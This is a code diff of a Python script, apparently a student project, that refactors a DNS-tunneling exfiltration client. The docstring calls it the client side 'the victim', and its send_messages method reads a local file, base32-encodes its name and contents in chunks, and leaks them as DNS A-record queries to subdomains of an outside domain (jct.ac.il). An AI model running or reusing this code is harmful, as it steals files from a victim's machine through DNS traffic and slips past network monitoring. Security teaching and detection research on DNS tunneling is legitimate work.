@@ -3,16 +3,21 @@ import base64
 import dns.resolver
 
 
-class Tool:
-    def __init__(self, path, label_len, record_len):
+class Client:
+    """
+    The Client class deals with the client side (the victim)
+    when it sends a single file from the victim
+    to the server via DNS messages
+    """
+    def __init__(self, path: str, label_len: int, record_len: int):
         self.path = path
         self.message = self.get_message()
         self.label_len = label_len
         self.record_len = record_len
-        self.file_name=self.get_file_name()
+        self.file_name = self.get_file_name()
         self.pkts = self.split_message()
 
-    def encode_to_Base32(self, str_):
+    def encode_to_base32(self, str_):
         b = bytes(str_, 'utf-8')
         mes = base64.b32encode(b)
 
@@ -32,6 +37,7 @@ class Tool:
     def get_file_name(self):
         file_name = self.path.split('\\')[-1]
         return file_name
+
     def split_message(self):
         pkts = list()
         pkts.append(self.file_name + f" #FILENAME#")
@@ -41,11 +47,11 @@ class Tool:
 
     def send_messages(self):
         for i, pkt in enumerate(self.pkts):
-            msg = self.encode_to_Base32(pkt)
+            msg = self.encode_to_base32(pkt)
             answers = dns.resolver.query(f'www.{msg}jct.ac.il', 'A')
 
 
 if __name__ == '__main__':
-    tool = Tool(r"C:\Users\מתניה\Functions_For_Project\Text.txt", 5, 15)
+    tool = Client(r"C:\Users\מתניה\Functions_For_Project\Text.txt", 5, 15)
 
     tool.send_messages()
